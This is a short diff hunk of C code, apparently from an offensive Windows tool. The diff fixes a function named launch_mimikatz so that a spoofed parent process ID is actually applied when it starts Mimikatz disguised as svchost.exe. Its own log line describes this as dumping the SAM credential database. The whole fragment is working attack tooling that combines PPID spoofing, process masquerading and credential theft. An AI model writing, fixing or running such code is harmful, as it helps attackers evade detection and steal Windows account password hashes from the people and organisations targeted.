@@ -113,9 +113,10 @@ static void launch_mimikatz(void) {
     }
     audit("[+] PPID attribute set");
 
-    STARTUPINFOA si = { .cb = sizeof(si) };
+    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(si) } };
+    si.lpAttributeList = attrList;
     PROCESS_INFORMATION pi;
-    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si, &pi)) {
+    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi)) {
         audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
         CloseHandle(pi.hThread);
         WaitForSingleObject(pi.hProcess, INFINITE);
